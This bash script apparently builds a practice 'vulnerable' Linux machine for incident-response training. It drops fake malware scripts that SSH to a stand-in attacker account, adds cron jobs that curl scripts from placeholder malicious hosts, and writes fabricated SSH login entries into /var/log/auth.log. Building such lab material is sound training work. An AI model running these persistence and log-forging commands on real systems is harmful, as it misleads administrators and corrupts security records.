#!/bin/bash

# Cleanup Phase

# Step 1: Remove fake malware files and directories
echo "Cleaning up previous setup..."
if [ -d "/opt/vulnerable" ]; then
  sudo rm -rf /opt/vulnerable
  echo "Removed /opt/vulnerable directory."
else
  echo "/opt/vulnerable directory not found. Skipping."
fi

# Step 2: Remove cron jobs
# The purpose of these commands is to remove the suspicious cron jobs related to the fake malware.
(sudo crontab -l | grep -v '/opt/vulnerable/malware.sh' | grep -v 'python3 /opt/vulnerable/exploit.py' | grep -v 'curl -s http://malicious-server.com/commands.sh -o /tmp/commands.sh' | grep -v 'curl -s https://another-malicious-server.com/update.sh -o /tmp/update.sh') | sudo crontab -
echo "Removed suspicious cron jobs."

# Step 3: Remove fake SSH log entries
# The purpose of these commands is to remove the fake SSH log entries added during the setup.
sudo sed -i '/Accepted publickey for user from 192.168.0.1 port 22 ssh2: RSA SHA256:example/d' /var/log/auth.log
sudo sed -i '/Accepted password for user from 192.168.0.2 port 22 ssh2/d' /var/log/auth.log
echo "Removed fake SSH log entries."

# Step 4: Remove log rotation configuration
# The purpose of this command is to remove the log rotation configuration added during the setup.
if [ -f "/etc/logrotate.d/vulnerable" ]; then
  sudo rm /etc/logrotate.d/vulnerable
  echo "Removed log rotation configuration for /var/log/auth.log."
else
  echo "Log rotation configuration not found. Skipping."
fi

# Step 5: Remove UFW rules added for this setup
# The purpose of these commands is to remove the UFW rules added during the setup.
sudo ufw delete deny from 192.168.0.1 || echo "No UFW rule for 192.168.0.1 found."
sudo ufw delete deny from 192.168.0.2 || echo "No UFW rule for 192.168.0.2 found."
echo "Removed UFW rules if they existed."

echo "Cleanup complete."

# Setup Phase

# Step 1: Install necessary tools
echo "Setting up the vulnerable machine..."
sudo apt-get update
sudo apt-get install -y net-tools

# Step 2: Create directories and fake malware files
mkdir -p /opt/vulnerable
echo "#!/bin/bash" > /opt/vulnerable/malware.sh
echo "echo 'Malware running...'" >> /opt/vulnerable/malware.sh
echo "ssh -o StrictHostKeyChecking=no h4x0r_group@10.0.1.10 'echo h4x0r_group >> /tmp/command.log'" >> /opt/vulnerable/malware.sh
chmod +x /opt/vulnerable/malware.sh

echo "import os" > /opt/vulnerable/exploit.py
echo "print('Exploit running...')" >> /opt/vulnerable/exploit.py
echo "os.system('ssh -o StrictHostKeyChecking=no h4x0r_group@10.0.1.10 \"echo h4x0r_group >> /tmp/command.log\"')" >> /opt/vulnerable/exploit.py

# Step 3: Set up cron jobs for fake malware activity
(crontab -l ; echo "*/5 * * * * /opt/vulnerable/malware.sh") | crontab -
(crontab -l ; echo "*/10 * * * * python3 /opt/vulnerable/exploit.py") | crontab -

# Step 4: Simulate network traffic
(crontab -l ; echo "*/15 * * * * curl -s http://malicious-server.com/commands.sh -o /tmp/commands.sh") | crontab -

# Step 5: Generate fake SSH logs
echo "Accepted publickey for user from 192.168.0.1 port 22 ssh2: RSA SHA256:example" >> /var/log/auth.log
echo "Accepted password for user from 192.168.0.2 port 22 ssh2" >> /var/log/auth.log
echo "Accepted publickey for user from 192.168.0.1 port 22 ssh2: RSA SHA256:example" >> /var/log/auth.log
echo "Accepted password for user from 192.168.0.2 port 22 ssh2" >> /var/log/auth.log

# Step 6: Create log rotation to mimic continuous activity
logrotate_conf="/etc/logrotate.d/vulnerable"
echo "/var/log/auth.log {
    daily
    rotate 7
    compress
    delaycompress
    missingok
    notifempty
    create 640 root adm
}" > $logrotate_conf

# Step 7: Simulate HTTP/HTTPS connections
(crontab -l ; echo "*/20 * * * * curl -s https://another-malicious-server.com/update.sh -o /tmp/update.sh") | crontab -

echo "Setup complete. Fake malware and logs have been created."
